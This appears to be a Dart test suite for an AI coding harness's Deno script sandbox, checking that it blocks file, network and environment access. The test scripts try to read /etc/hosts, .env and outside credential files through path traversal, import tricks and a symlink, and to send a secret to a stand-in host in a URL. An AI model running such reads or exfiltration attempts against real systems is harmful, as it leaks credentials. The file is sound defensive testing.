import 'dart:convert';
import 'dart:io';

import 'package:every_ai/features/code/harness/everyai/llm.dart';
import 'package:every_ai/features/code/harness/everyai/script_io.dart';
import 'package:every_ai/features/code/harness/everyai/shell_io.dart';
import 'package:every_ai/features/code/harness/everyai/tools_io.dart';
import 'package:every_ai/features/code/harness/harness.dart' show ScriptCaps;
import 'package:flutter_test/flutter_test.dart';
import 'package:http/http.dart' as http;
import 'package:http/testing.dart';

/// Real Deno (tool/fetch_deno.sh) with a fake gateway: skipped without it.
void main() {
  final deno = findDeno();
  late Directory tmp;
  late List<Map<String, Object?>> sent;

  ScriptRunner runner({int maxStream = 64000000}) {
    final gateway = GatewayClient(
      baseUrl: 'http://gw/v1',
      apiKey: 'k',
      client: MockClient((req) async {
        final body = jsonDecode(req.body) as Map<String, Object?>;
        sent.add({'path': req.url.path, ...body});
        if (req.url.path.endsWith('/aux/decide')) {
          final qs = (body['questions']! as List).cast<Map<String, Object?>>();
          return http.Response(
            jsonEncode({
              'answers': [
                for (final (n, q) in qs.indexed)
                  {'id': q['id'], 'value': q['kind'] == 'score' ? (n.isEven ? 0.9 : 0.1) : true},
              ],
            }),
            200,
          );
        }
        return http.Response(
          jsonEncode({
            'choices': [
              {
                'message': {'role': 'assistant', 'content': 'summary of ${(body['messages'] as List).length} msgs'},
              },
            ],
          }),
          200,
        );
      }),
    );
    return ScriptRunner(
      deno: deno!,
      dir: '${tmp.path}/.scripts',
      root: '${tmp.path}/repo',
      tools: ToolRunner(
        root: '${tmp.path}/repo',
        shell: SessionShell(root: '${tmp.path}/repo', sessionTag: 't', scratchDir: '${tmp.path}/.sh'),
        gateway: gateway,
        sessionTag: 't',
      ),
      gateway: gateway,
      sessionTag: 't',
      maxStream: maxStream,
    );
  }

  setUp(() {
    tmp = Directory.systemTemp.createTempSync('script').absolute;
    tmp = Directory(tmp.resolveSymbolicLinksSync());
    Directory('${tmp.path}/repo/lib').createSync(recursive: true);
    File('${tmp.path}/repo/lib/a.dart').writeAsStringSync('void a() {}\n');
    File('${tmp.path}/repo/lib/b.dart').writeAsStringSync('void b() {}\n');
    File('${tmp.path}/repo/.env').writeAsStringSync('SECRET=abcdefgh12345678\n');
    File('${tmp.path}/outside.txt').writeAsStringSync('nope');
    sent = [];
  });
  tearDown(() => tmp.deleteSync(recursive: true));

  test('the sandbox: no files, network or env of its own; bridge refuses outside and secrets', () async {
    final r = await runner().run(r'''
for (const f of [() => Deno.readTextFile("/etc/hosts"), () => fetch("https://example.com"), async () => Deno.env.get("HOME")]) {
  try { await f(); console.log("ALLOWED"); } catch (e) { console.log("blocked", e.name); }
}
for (const p of ["../outside.txt", ".env"]) {
  try { await readFile(p); console.log("READ", p); } catch (e) { console.log("refused", p, e.message); }
}
''', budget: ScriptBudget(const ScriptCaps()));
    expect(r.output, isNot(contains('ALLOWED')));
    expect(r.output, isNot(contains('READ')));
    expect('blocked'.allMatches(r.output).length, 3);
    expect(r.output, contains('refused ../outside.txt'));
    expect(r.output, contains('refused .env'));
  }, skip: deno == null ? 'no deno' : false);

  test('imports cannot read files: static, literal dynamic, the project .env, node:fs', () async {
    final out = Directory('${tmp.path}/outside')..createSync();
    File('${out.path}/creds.txt').writeAsStringSync('S3CRET-TXT');
    File('${out.path}/creds.json').writeAsStringSync('{"k": "S3CRET-JSON"}');
    File('${out.path}/mod.ts').writeAsStringSync('export const s: string = "S3CRET-TS";');
    final env = '${tmp.path}/repo/.env';
    final programs = [
      'import t from "file://${out.path}/creds.txt" with { type: "text" };\nconsole.log(t);',
      'import j from "file://${out.path}/creds.json" with { type: "json" };\nconsole.log(JSON.stringify(j));',
      'import { s } from "file://${out.path}/mod.ts";\nconsole.log(s);',
      'import t from "${out.path}/creds.txt" with { type: "text" };\nconsole.log(t);',
      'console.log((await import("file://${out.path}/creds.txt", { with: { type: "text" } })).default);',
      'import t from "file://$env" with { type: "text" };\nconsole.log(t);',
      'import t from "../outside/creds.txt" with { type: "text" };\nconsole.log(t);',
      'import fs from "node:fs";\nconsole.log(fs.readFileSync("${out.path}/creds.txt", "utf8"));',
    ];
    for (final code in programs) {
      final r = await runner().run(code, budget: ScriptBudget(const ScriptCaps()));
      expect(r.exitCode, isNot(0), reason: '$code\n${r.output}');
      expect(r.output, isNot(contains('S3CRET')), reason: code);
      expect(r.output, isNot(contains('abcdefgh12345678')), reason: code);
    }
  }, skip: deno == null ? 'no deno' : false);

  test('grep never returns secret files, a .env glob included', () async {
    File('${tmp.path}/repo/.env').writeAsStringSync('KEY=MARKER-ENV-1\n');
    Directory('${tmp.path}/repo/certs').createSync();
    File('${tmp.path}/repo/certs/server.pem').writeAsStringSync('MARKER-PEM-1\n');
    File('${tmp.path}/repo/lib/c.dart').writeAsStringSync('// MARKER-OK\n');
    final r = await runner().run(r'''
console.log(await grep("MARKER", { mode: "content" }));
console.log(await grep("MARKER", { mode: "count" }));
console.log(await grep("MARKER"));
console.log(await grep(".", { glob: ".env", mode: "content" }));
console.log(await grep(".", { glob: "*.pem", mode: "content" }));
try { await grep(".", { path: ".env" }); console.log("ALLOWED"); } catch (e) { console.log("refused"); }
''', budget: ScriptBudget(const ScriptCaps()));
    expect(r.exitCode, 0, reason: r.output);
    expect(r.output, contains('MARKER-OK'));
    expect(r.output, isNot(contains('MARKER-ENV')));
    expect(r.output, isNot(contains('MARKER-PEM')));
    expect(r.output, isNot(contains('server.pem')));
    expect(r.output, isNot(contains('ALLOWED')));
    // The grep tool itself too, pointed at the file.
    final direct = await runner().tools.run(ToolNames.grep, {'pattern': '.', 'path': '.env', 'output_mode': 'content'});
    expect(direct.isError, isTrue);
    expect(direct.text, isNot(contains('MARKER-ENV')));
    // A harmless-looking link to a secret is checked where it points.
    Link('${tmp.path}/repo/lib/notes.txt').createSync('${tmp.path}/repo/.env');
    final linked = await runner().tools.run(ToolNames.grep, {
      'pattern': '.',
      'path': 'lib/notes.txt',
      'output_mode': 'content',
    });
    expect(linked.isError, isTrue);
    expect(linked.text, isNot(contains('MARKER-ENV')));
  }, skip: deno == null ? 'no deno' : false);

  test('a bridged webFetch gets the same secret check as the tool, before any request', () async {
    final r = await runner().run(r'''
try { await webFetch("https://x.test/?q=abcdefgh12345678"); console.log("ALLOWED"); } catch (e) { console.log("refused:", e.message); }
''', budget: ScriptBudget(const ScriptCaps()));
    expect(r.output, isNot(contains('ALLOWED')));
    expect(r.output, contains('the URL contains'));
    expect(sent, isEmpty);
  }, skip: deno == null ? 'no deno' : false);

  test('a runaway program is stopped at its timeout', () async {
    final r = await runner().run(
      'while (true) {}',
      budget: ScriptBudget(const ScriptCaps()),
      timeout: const Duration(seconds: 2),
    );
    expect(r.timedOut, isTrue);
  }, skip: deno == null ? 'no deno' : false);
}
